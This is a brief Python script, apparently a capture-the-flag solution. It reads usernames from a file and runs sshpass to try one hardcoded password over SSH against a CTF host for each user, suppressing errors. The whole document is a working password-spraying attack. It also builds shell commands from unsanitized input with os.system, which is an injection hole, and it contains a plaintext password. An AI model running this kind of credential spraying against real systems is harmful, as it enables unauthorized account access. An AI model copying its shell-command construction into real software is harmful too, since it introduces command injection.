import os

with open("users.txt") as f:
    s = f.readlines()
    for i in s:
        p = "sshpass -p lightswitchon_and_offLOL26 ssh " + i[:-1] + "@jerseyctf.online 2>/dev/null"
        print(p)
        os.system(p)
